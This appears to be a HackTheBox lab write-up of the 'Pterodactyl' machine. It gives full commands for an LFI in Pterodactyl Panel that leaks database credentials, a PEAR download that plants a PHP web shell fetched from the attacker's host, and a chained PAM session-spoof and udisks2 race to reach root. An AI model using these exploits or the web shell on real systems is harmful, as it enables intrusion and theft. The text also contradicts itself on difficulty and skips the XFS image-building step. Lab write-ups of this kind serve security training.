Pterodactyl Writeup

Author: atrox | Tags: Linux, LFI, PHP-PEAR, RCE, CVE-2025-6018, CVE-2025-6019

Overview

Pterodactyl is a Medium-difficulty Linux machine that involves exploiting an LFI vulnerability in Pterodactyl Panel v1.11.10 combined with PHP-PEAR to achieve RCE. Initial access as wwwrun leads to lateral movement via password reuse, and root escalation requires chaining two recent CVEs: CVE-2025-6018 and CVE-2025-6019.

Machine Information

  • Platform: HackTheBox
  • Difficulty: Hard
  • OS: Linux
  • IP Address: 10.129.3.120

Summary

This machine involves exploiting an LFI vulnerability in Pterodactyl Panel v1.11.10 combined with PHP-PEAR to achieve RCE. After gaining initial access as wwwrun, password reuse allows lateral movement to user phileasfogg3. Root privilege escalation requires chaining two recent CVEs: CVE-2025-6018 (PAM environment injection) and CVE-2025-6019 (udisks2 XFS resize TOCTOU).

Initial Foothold

Vulnerability Overview

The presence of include_path pointing to /usr/share/php/PEAR creates an attack vector. Pterodactyl Panel includes a vulnerable endpoint /locales/locale.json that allows directory traversal through the locale parameter, which can be combined with PEAR's pearcmd.php to achieve code execution.

Step 1: Verify LFI and Leak Database Credentials

curl -H "Host: panel.pterodactyl.htb" \
  "http://10.129.3.120/locales/locale.json?locale=../../../pterodactyl&namespace=config/database"

Response:

{
  "connections": {
    "mysql": {
      "host": "127.0.0.1",
      "port": "3306",
      "database": "panel",
      "username": "pterodactyl",
      "password": "PteraPanel"
    }
  }
}

Credentials Found: pterodactyl:PteraPanel

Step 2: Write PHP Web Shell Using PEAR Download

Setup HTTP Server on Kali:

echo '<?php system($_GET[0]); ?>' > shell.php
python3 -m http.server 80

Trigger PEAR Download:

curl --globoff \
  "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+download+http://<KALI_IP>/shell.php"

Error Message Reveals Save Location:

Could not get contents of package "/var/www/pterodactyl/public/shell.php". Invalid tgz file.

The file was written to /var/www/pterodactyl/public/shell.php

Step 3: Verify Command Execution

curl "http://panel.pterodactyl.htb/shell.php?0=id"

Output:

uid=474(wwwrun) gid=477(www) groups=477(www)

✅ RCE Achieved as wwwrun

Privilege Escalation

The privilege escalation exploits two chained CVEs:

  • CVE-2025-6018 - PAM environment variable injection to spoof a local session
  • CVE-2025-6019 - TOCTOU in udisks2 XFS resize, allowing nosuid bypass

Step 1: Session Spoofing (CVE-2025-6018)

Create PAM Environment File:

echo 'XDG_SEAT DEFAULT="seat0"' > ~/.pam_environment
echo 'XDG_VTNR DEFAULT="1"' >> ~/.pam_environment

Log out and log back in via SSH.

Verify Session Status:

loginctl session-status
59 - phileasfogg3 (1002)
           Since: Thu 2026-02-12 00:58:59 EET; 8s ago
          Leader: 11991 (sshd)
            Seat: seat0; vc1
           State: active

✅ Session is now treated as physical console - Polkit will allow udisksctl without authentication

Step 2: XFS Image Race Condition (CVE-2025-6019)

We create a malicious XFS image containing an SUID-root bash binary and exploit a race condition during a resize operation.

# On Target as phileasfogg3:
# Background watcher – waits for the temporary /tmp/blockdev* mount
(while true; do
    for dev in /tmp/blockdev*; do
        if [ -d "$dev" ] && [ -x "$dev/bash" ]; then
            echo "Caught SUID bash at $dev/bash"
            "$dev/bash" -p -c "id; cat /root/root.txt" > /tmp/root_out.txt 2>&1
            break 2
        fi
    done
    sleep 0.001
done) &

# Trigger the resize operation – this creates a temporary mount without nosuid
gdbus call --system \
    --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
    --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}" 2>/dev/null

Step 3: Root Flag

cat /root/root.txt

Conclusion

The Pterodactyl machine demonstrated a complex attack chain: LFI to RCE via PHP-PEAR, lateral movement via password reuse, and privilege escalation via chained session spoofing and file system race conditions. This highlights the criticality of securing file inclusion endpoints and patching core services like PAM and udisks2.

Attack Chain Summary

Web LFI → Database Creds → PEAR RCE → wwwrun Shell → Password Reuse → phileasfogg3 → CVE-2025-6018 (PAM Spoof) → CVE-2025-6019 (udisks2 TOCTOU) → Root Flag
